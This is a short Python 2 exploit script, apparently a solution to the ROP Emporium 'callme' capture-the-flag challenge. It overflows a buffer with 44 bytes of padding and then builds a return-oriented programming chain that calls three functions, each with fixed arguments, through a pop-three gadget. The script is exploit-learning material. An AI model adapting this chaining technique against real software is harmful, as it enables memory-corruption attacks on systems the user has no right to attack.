#!/usr/bin/env python2
import struct

def p(x):
    return struct.pack("<I", x)

# Function locations
callme_one   = p(0x080484f0)
callme_two   = p(0x08048550)
callme_three = p(0x080484e0)

# Arguments required for each function call
args     = p(0xdeadbeef) + p(0xcafebabe) + p(0xd00df00d)

# Gadget: three pops
pop3_ret = p(0x080487f9)

# Overflow
buf = ' '*44

#callme_one
buf += callme_one
buf += pop3_ret
buf += args

#callme_two
buf += callme_two
buf += pop3_ret
buf += args

#callme_three
buf += callme_three
buf += pop3_ret
buf += args

print(buf)
